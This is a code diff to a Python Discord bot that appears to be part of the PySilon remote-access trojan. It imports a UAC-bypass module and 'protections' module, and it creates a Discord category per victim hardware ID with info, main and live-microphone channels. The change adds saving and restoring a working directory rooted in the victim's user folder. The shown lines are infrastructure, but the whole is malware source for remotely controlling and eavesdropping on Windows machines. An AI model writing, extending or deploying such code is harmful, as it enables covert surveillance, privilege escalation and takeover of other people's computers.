@@ -1,12 +1,14 @@
-import discord
 import os
+import json
 import ctypes
+import discord
 import subprocess
+from getpass import getuser
 from discord.ext import commands
-import resources.modules.misc as pysilon_misc
-import resources.modules.protections as pysilon_protections
-import resources.modules.uac_bypass as uac_bypass
 from urllib.request import urlopen
+import resources.modules.misc as pysilon_misc
+import resources.modules.uac_bypass as uac_bypass
+import resources.modules.protections as pysilon_protections
 
 def IsAdmin() -> bool:
     return ctypes.windll.shell32.IsUserAnAdmin() == 1
@@ -34,7 +36,8 @@ channel_ids = {
 
 @client.event
 async def on_ready():
-    global category, guild_id
+    global category, guild_id, working_directory
+    working_directory = None
     first_run = True
     guild_id_index = 0
     guild_id = guild_ids[guild_id_index]
@@ -64,6 +67,7 @@ async def on_ready():
                 break
     
     if not first_run:
+        working_directory = fetch_working_dir()
         category_channel_names = []
         for channel in category.channels:
             category_channel_names.append(channel.name)
@@ -77,6 +81,7 @@ async def on_ready():
             channel_ids['voice'] = temp.id
 
     if first_run:
+        working_directory = ["C:", "Users", getuser()]; save_working_dir()
         category = await client.get_guild(guild_id).create_category(hwid)
         temp = await client.get_guild(guild_id).create_text_channel('info', category=category); channel_ids['info'] = temp.id
         temp = await client.get_guild(guild_id).create_text_channel('main', category=category); channel_ids['main'] = temp.id
@@ -108,6 +113,16 @@ async def on_ready():
                 channel_ids['main'] = channel.id
             elif channel.name == 'Live microphone':
                 channel_ids['voice'] = channel.id
+
+def fetch_working_dir():
+    global working_directory
+    with open('resources/configs/working_directory.json', 'r') as fetch_dir:
+        working_directory = json.load(fetch_dir)
+    return working_directory
+def save_working_dir():
+    global working_directory
+    with open('resources/configs/working_directory.json', 'w') as save_dir:
+        json.dump(working_directory, save_dir)
 
 @client.event
 async def on_message(ctx):
